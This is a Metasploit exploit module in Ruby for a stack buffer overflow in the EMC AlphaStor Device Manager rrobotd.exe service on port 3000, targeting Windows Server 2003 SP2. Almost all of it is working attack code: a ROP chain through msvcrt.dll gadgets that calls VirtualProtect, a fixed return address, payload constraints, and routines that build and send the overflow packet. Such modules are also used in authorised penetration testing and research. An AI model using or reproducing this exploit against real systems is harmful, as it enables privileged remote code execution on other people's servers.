require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EMC AlphaStor Device Manager Opcode 0x72',
			'Description'    => %q{
				This module exploits a stack based buffer overflow vulnerability
				found in EMC Alphastor Device Manager. The overflow is triggered
				when sending a specially crafted packet to the rrobotd.exe service
				listening on port 3000. During the copying of strings to the stack
				an unbounded sprintf() function overwrites the return pointer
				leading to remote code execution.
			},
			'Author'         => [ 
								  'Mohsan Farid',		# faridms@gmail.com
								  'Preston Thornburg',	# prestonthornburg@gmail.com
								  'Brent Morris'		# inkrypto@gmail.com
								],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', '0day' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space' => 160,
					'DisableNops' => 'true',
					'BadChars' => "\x00\x09\x0a\x0d",
					'StackAdjustment' => -404,
					'PrependEncoder' => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
					'Compat'	=> 
					{
						'ConnectionType'	=> '+ws2ord',
					}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 
						'Windows Server 2003 SP2 EN', 
							{ 
								# pop eax/ retn
								# msvcrt.dll
								'Ret' => 0x77bc5d88, 
							} 
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 14 2013'))

		register_options(
			[
				Opt::RPORT(3000)
			], self.class )
	end

	def exploit
		connect

		# msvcrt.dll
		# 96 bytes
		rop = [
			0x77bb2563,	# pop eax/ retn 
                        0x77ba1114,	# ptr to kernel32!virtualprotect
                        0x77bbf244,	# mov eax, dword ptr [eax]/ pop ebp/ retn
                        0xfeedface,
                        0x77bb0c86,	# xchg eax, esi/ retn
                        0x77bc9801,	# pop ebp/ retn
                        0x77be2265,
                        0x77bb2563,	# pop eax/ retn
                        0x03C0990F,
                        0x77bdd441,	# sub eax, 3c0940fh/ retn
                        0x77bb48d3,	# pop eax/ retn
                        0x77bf21e0,
                        0x77bbf102,	# xchg eax, ebx/ add byte ptr [eax], al/ retn
                        0x77bbfc02,	# pop ecx/ retn
                        0x77bef001,
                        0x77bd8c04,	# pop edi/ retn
                        0x77bd8c05,
                        0x77bb2563,	# pop eax/ retn
                        0x03c0984f,
                        0x77bdd441,	# sub eax, 3c0940fh/ retn
                        0x77bb8285,	# xchg eax, edx/ retn
                        0x77bb2563,	# pop eax/ retn
                        0x90909090,
                        0x77be6591,	# pushad/ add al, 0efh/ retn
		].pack("V*")

		buf = "\xcc" * 550
		buf[246, 4] = [target.ret].pack('V')
		buf[250, 4] = [0x77bf6f80].pack('V')
		buf[254, rop.length] = rop
		buf[350, payload.encoded.length] = payload.encoded

		packet = "\x72#{buf}"

		print_status("Trying target %s..." % target.name)

		sock.put(packet)

		handler
		disconnect
	end

end
